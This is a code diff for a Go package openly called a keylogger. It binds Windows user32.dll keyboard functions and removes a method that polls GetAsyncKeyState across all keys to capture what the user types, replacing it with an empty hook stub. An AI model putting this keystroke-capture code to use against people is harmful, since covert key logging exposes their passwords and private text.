@@ -12,12 +12,10 @@ import (
 var (
 	moduser32 = syscall.NewLazyDLL("user32.dll")
 
-	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
-	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
-	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
-	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
-	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
-	procGetKeyState           = moduser32.NewProc("GetKeyState")
+	procGetKeyboardLayout = moduser32.NewProc("GetKeyboardLayout")
+	procGetKeyboardState  = moduser32.NewProc("GetKeyboardState")
+	procToUnicodeEx       = moduser32.NewProc("ToUnicodeEx")
+	procGetKeyState       = moduser32.NewProc("GetKeyState")
 )
 
 // NewKeylogger creates a new keylogger depending on
@@ -41,32 +39,9 @@ type Key struct {
 	Keycode int
 }
 
-// GetKey gets the current entered key by the user, if there is any
-func (kl *Keylogger) GetKey() Key {
-	activeKey := 0
-	var keyState uint16
+// Hook registers the Windows hook
+func (kl *Keylogger) Hook() {
 
-	for i := 0; i < 256; i++ {
-		keyState = w32.GetAsyncKeyState(i)
-
-		// Check if the most significant bit is set (key is down)
-		// And check if the key is not a non-char key (except for space, 0x20)
-		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
-			activeKey = i
-			break
-		}
-	}
-
-	if activeKey != 0 {
-		if activeKey != kl.lastKey {
-			kl.lastKey = activeKey
-			return kl.ParseKeycode(activeKey, keyState)
-		}
-	} else {
-		kl.lastKey = 0
-	}
-
-	return Key{Empty: true}
 }
 
 // ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
